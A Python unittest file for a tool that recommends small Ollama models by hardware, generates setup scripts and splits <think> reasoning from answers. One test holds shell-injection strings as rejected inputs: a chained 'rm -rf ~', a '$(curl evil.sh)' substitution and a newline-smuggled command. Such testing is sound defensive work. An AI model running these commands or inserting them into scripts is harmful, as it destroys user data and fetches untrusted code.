import unittest

from tests import helpers  # noqa: F401
from spaghetti.advisor.catalog import CATALOG, OLLAMA_TAGS, fit, recommend_default
from spaghetti.advisor.scripts import make_script
from spaghetti.kitchen.thinking import ThinkSplitter, split_thinking


class AdvisorTests(unittest.TestCase):
    def test_default_model_scales_with_hardware(self):
        self.assertEqual(recommend_default(32, 24), "llama3.2:3b")
        self.assertEqual(recommend_default(16, 0), "llama3.2:3b")
        self.assertEqual(recommend_default(8, 0), "llama3.2:3b")
        self.assertIn(recommend_default(4, 0), {"qwen3:0.6b", "gemma3:1b", "llama3.2:1b", "qwen3:1.7b"})
        self.assertEqual(recommend_default(1, 0), "qwen3:0.6b")  # nothing fits: smallest, never a crash

    def test_menu_is_small_models_only(self):
        self.assertLessEqual(max(m.params_b for m in CATALOG), 3.2)
        self.assertLessEqual(max(m.size_gb for m in CATALOG), 2.0)
        self.assertEqual(len({m.tag for m in CATALOG}), len(CATALOG))

    def test_fit_labels(self):
        big = next(m for m in CATALOG if m.tag == "llama3.2:3b")
        self.assertEqual((fit(big, 32, 0), fit(big, 3, 0)), ("comfortable", "no"))


class ScriptTests(unittest.TestCase):
    def test_scripts_contain_only_menu_tags(self):
        name, body = make_script("unix", ["qwen3:1.7b"])
        self.assertEqual(name, "spaghetti-setup.sh")
        self.assertIn("ollama pull qwen3:1.7b", body)
        self.assertEqual(make_script("windows", ["qwen3:1.7b"])[0], "spaghetti-setup.bat")

    def test_shell_injection_is_rejected(self):
        for evil in (["qwen3:1.7b; rm -rf ~"], ["$(curl evil.sh)"], [], ["qwen3:1.7b\nrm x"]):
            with self.assertRaises(ValueError):
                make_script("unix", evil)
        self.assertIn("qwen3:1.7b", OLLAMA_TAGS)


class ThinkingTests(unittest.TestCase):
    def test_splits_think_block(self):
        self.assertEqual(split_thinking("<think>hmm</think>Eight minutes."), ("Eight minutes.", "hmm"))

    def test_missing_open_tag(self):
        self.assertEqual(split_thinking("reasoning...</think>Answer"), ("Answer", "reasoning..."))

    def test_truncated_thinking_leaves_empty_answer(self):
        self.assertEqual(split_thinking("<think>still going")[0], "")

    def test_streaming_splitter_handles_tags_split_across_chunks(self):
        sp, out = ThinkSplitter(), []
        for chunk in ["<thi", "nk>pla", "n</th", "ink>Eight ", "minutes"]:
            out += sp.feed(chunk)
        out += sp.flush()
        think = "".join(t for k, t in out if k == "think")
        answer = "".join(t for k, t in out if k == "answer")
        self.assertEqual((think, answer), ("plan", "Eight minutes"))

    def test_streaming_splitter_plain_text(self):
        sp = ThinkSplitter()
        self.assertEqual(sp.feed("Hello <3 world") + sp.flush(), [("answer", "Hello <3 world")])


if __name__ == "__main__":
    unittest.main()
